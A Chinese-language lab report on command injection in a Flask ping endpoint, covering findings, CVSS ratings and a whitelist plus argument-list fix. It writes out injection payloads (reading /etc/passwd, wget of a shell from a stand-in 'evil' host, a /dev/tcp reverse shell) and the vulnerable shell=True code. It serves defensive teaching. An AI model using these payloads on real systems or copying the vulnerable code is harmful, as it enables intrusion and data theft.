一、实验概述

Experiment Overview

1.1 什么是命令注入？

命令注入是指攻击者通过在用户输入中嵌入操作系统命令，利用服务端不安全的命令执行方式，让服务端执行攻击者指定的任意系统命令。

攻击者输入: 127.0.0.1; cat /etc/passwd 服务端执行: ping -c 3 127.0.0.1; cat /etc/passwd └──────────┬──────────┘ 额外执行的恶意命令！

1.3 命令注入的危害路径

攻击者控制 ip 参数 → f"ping -c 3 {ip}" → shell=True ├─ 读取文件 /etc/passwd ├─ 写入 Webshell ├─ 安装后门 wget恶意软件 └─ 反弹 Shell bash -i >& /dev/tcp/ip/port

二、漏洞分析与修复

Vulnerability Analysis & Remediation

1

分号分隔符命令注入

严重 · CVSS 9.8

CWE-78 · f-string 拼接 + shell=True

Python — 问题代码
cmd = f"ping -c 3 {ip}"          # f-string 拼接
output = subprocess.check_output(cmd, shell=True)  # shell=True

攻击复现：curl -X POST ... -d "ip=127.0.0.1; cat /etc/passwd" → 读取系统文件。攻击者可执行 ; id、; whoami、; wget http://evil/shell.php、; bash -i >& /dev/tcp/ip/port 等任意命令。

2

管道符命令注入

严重

CWE-78 · | 管道符将前命令输出作为后命令输入

curl -X POST ... -d "ip=127.0.0.1|whoami"  # 返回: root
3

逻辑运算符命令注入

严重

&& 前命令成功则执行后命令

curl -X POST ... -d "ip=127.0.0.1&&id"  # 返回: uid=0(root)
4

反引号命令注入

严重

`cmd` 和 $(cmd) 子 Shell 执行

curl -X POST ... -d "ip=127.0.0.1`id`"     # 反引号
curl -X POST ... -d "ip=127.0.0.1$(id)"   # $() 子Shell
5

shell=True 命令注入

严重

不安全的 API 调用——字符串被 /bin/sh -c 解析

subprocess.check_output("ping -c 3 127.0.0.1;id", shell=True) ↓ /bin/sh -c "ping -c 3 127.0.0.1;id" ↓ Shell 解析：① ping ② ; 分隔符 ③ id 第二条命令 → 两条都执行！
❌ shell=True字符串经 shell 解析，分隔符变命令边界
✅ 参数列表["ping", ip] 不经过 shell，参数被当作普通字符串
6

CSRF 缺失

中危

CWE-352 · Ping 接口无 CSRF Token 校验

CSRF + 命令注入 = 远程命令执行：攻击者构造恶意页面诱导管理员访问 → 浏览器自动提交 POST（附带 Cookie）→ 服务端执行恶意命令。

7

错误信息泄露

低危

修复前：error = f"执行失败: {e}" 暴露系统细节。

三、防护方案

Security Hardening

3.1 四层纵深防御

用户输入 IP 地址 ↓ 第1关：CSRF Token 校验 → 403 ↓ 第2关：validate_hostname() 白名单 只允许 a-zA-Z0-9._- , 长度≤255 ↓ 第3关：参数列表模式（无 shell=True） cmd = ["ping", "-c", "3", ip] ↓ 第4关：统一错误提示

3.2 核心修复代码

Python
def validate_hostname(hostname):
    if not hostname or len(hostname) > 255: return False
    allowed = re.match(r"^[a-zA-Z0-9.\-_]+$", hostname)
    if not allowed: return False
    if hostname.startswith((".","-")) or hostname.endswith((".","-")): return False
    return True

@app.route("/ping", methods=["GET", "POST"])
@login_required
def ping():
    if request.method == "POST":
        if not validate_csrf(): abort(403)

        ip = request.form.get("ip", "").strip()
        if not ip: error = "请输入 IP 地址"
        elif not validate_hostname(ip): error = "输入包含非法字符"
        else:
            cmd = ["ping", "-c", "3", ip]  # 参数列表！
            output = subprocess.check_output(cmd, timeout=30)
            result = output.decode("utf-8", errors="replace")
    return render_template("ping.html", result=result, error=error)

3.3 白名单拦截验证

127.0.0.1; cat /etc/passwd → ; 和空格不在白名单 → 拦截 127.0.0.1|whoami → | 不在白名单 → 拦截 127.0.0.1&&id → & 不在白名单 → 拦截 127.0.0.1`id` → ` 不在白名单 → 拦截 127.0.0.1$(id) → $() 不在白名单 → 拦截 127.0.0.1 ✅ 合法 8.8.8.8 ✅ 合法 localhost ✅ 合法

四、总结与项目汇总

Summary & Project Overview

4.1 命令注入防护三条铁律

铁律1：永远不要用 shell=True 铁律2：永远不要用字符串拼接构建命令 铁律3：如果必须用字符串，先做严格的输入白名单校验

"命令注入是所有 Web 漏洞中最'致命'的一种——因为它让攻击者直接操作了操作系统。"

从 f"ping -c 3 {ip}" 到安全版本，核心只有两个改变：shell=True → 参数列表模式 + 白名单校验。就是这两个改变，让攻击者从"可以执行任意命令"变成了"只能 ping 一个合法的 IP 地址"。
